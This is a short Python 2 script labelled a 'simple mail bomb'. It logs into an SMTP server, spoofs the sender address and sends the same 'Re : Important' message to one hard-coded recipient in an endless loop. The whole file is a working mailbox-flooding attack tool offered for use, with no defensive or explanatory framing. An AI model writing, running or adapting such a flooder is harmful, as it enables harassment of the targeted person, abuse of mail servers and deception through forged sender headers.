import smtplib

# Simple mail bomb in python
from email.mime.text import MIMEText

def sendMail(user,pwd,fakeuser,to,subject,text):
    msg = MIMEText(text)
    msg['From'] = fakeuser
    msg['To'] = to
    msg['Subject'] = subject
    try:
        
            
            smtpServer = smtplib.SMTP('IP Server smtp mail',25) 
            print '[+] Connecting to Mail server'
            smtpServer.ehlo()
            print '[+] Starting Encrypted Session'
            smtpServer.starttls()
            smtpServer.ehlo()
            print '[+] Logging Into Mail Server'
            smtpServer.login(user,pwd)
            print '[+] Sending Mail'
            while 1:
	        smtpServer.sendmail(user,to,msg.as_string())
	        print "[+] Mail sent successfully"
	    
            smtpServer.close()
            
    except Exception,e:
            print '[-] Sending Mail Failed'
            print e


user = '' # email
pwd = '' # password of email
fakeuser = '' # fakeuser
sendMail(user,pwd,fakeuser,'hellouguj@yopmail.com','Re : Important', 'Test Message')

